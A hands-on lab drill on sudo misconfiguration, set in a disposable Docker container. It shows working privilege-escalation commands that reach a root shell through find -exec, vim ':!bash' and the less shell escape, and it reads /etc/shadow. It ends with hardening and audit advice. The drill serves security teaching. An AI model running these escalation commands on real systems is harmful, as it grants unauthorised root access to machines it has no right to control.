# Drill 05: Sudo Misconfiguration

Time: 10 minutes

## What You're Doing

Admin gave you sudo access to "safe" commands. You find a way to abuse it for root shell.

## Setup
```bash
docker run -it --rm ubuntu:22.04 /bin/bash
apt update && apt install -y sudo vim
useradd -m hacker
echo "hacker:password" | chpasswd
```

Give hacker limited sudo (admin thinks this is safe):
```bash
echo "hacker ALL=(ALL) NOPASSWD: /usr/bin/find" >> /etc/sudoers
```

This means: hacker can run find as root without password.

Admin thinks: "find just searches files, harmless."

Switch to hacker:
```bash
su - hacker
```

## Check What You Can Run
```bash
sudo -l
```

Shows:
```
User hacker may run the following commands:
    (ALL) NOPASSWD: /usr/bin/find
```

You can run find as root.

## Exploit It
```bash
sudo find /tmp -exec /bin/bash \;
```

Check:
```bash
whoami
id
```

You're root.

## Why This Worked

Admin gave you sudo access to find.

find has -exec flag.

You used -exec to run bash.

bash ran as root because sudo ran find as root.

## Another Dangerous Example: vim

Exit back to root:
```bash
exit
exit
```

Give hacker sudo vim:
```bash
echo "hacker ALL=(ALL) NOPASSWD: /usr/bin/vim" >> /etc/sudoers
su - hacker
```

Exploit vim:
```bash
sudo vim -c ':!bash'
```

Instant root shell. vim can execute commands.

## Even "Safe" Commands Can Be Dangerous

Exit and try with less:
```bash
exit
exit
apt install -y less
echo "hacker ALL=(ALL) NOPASSWD: /usr/bin/less" >> /etc/sudoers
su - hacker
```

Run less as root:
```bash
sudo less /etc/shadow
```

While in less, press `!` then type:
```bash
bash
```

You get root shell. less has shell escape.

## Check Your Own Sudo Rights
```bash
sudo -l
```

Shows what you can run as root.

Look for:
- Text editors (vim, nano, emacs)
- Pagers (less, more)
- Interpreters (python, perl, ruby)
- Tools with -exec or shell escapes (find, awk, sed with -e)

## Defense

Never give sudo to:
- vim, nano (has :! or shell escape)
- less, more (has ! command)
- find (has -exec)
- python, perl, bash (direct code execution)

If you must give sudo, use:
- Specific commands with full paths and limited arguments
- Restricted shells
- sudoedit for editing (safer than vim)

Example safe sudoers:
```bash
user ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart apache2
```

Specific service only, can't abuse it.

Bad sudoers:
```bash
user ALL=(ALL) NOPASSWD: /usr/bin/systemctl
```

Can restart anything, potential abuse.

## Audit sudo Configuration
```bash
cat /etc/sudoers
cat /etc/sudoers.d/*
```

Check for overly permissive rules.

## Exit
```bash
exit
exit
```

## Key Resources

Check GTFOBins.github.io for every binary before granting sudo.

Search: "gtfobins [command]" to see if it can be exploited.

## Key Lesson

Sudo to "harmless" commands often isn't harmless.

vim, less, find all seem safe but give root shells.

Always check GTFOBins before granting sudo access.
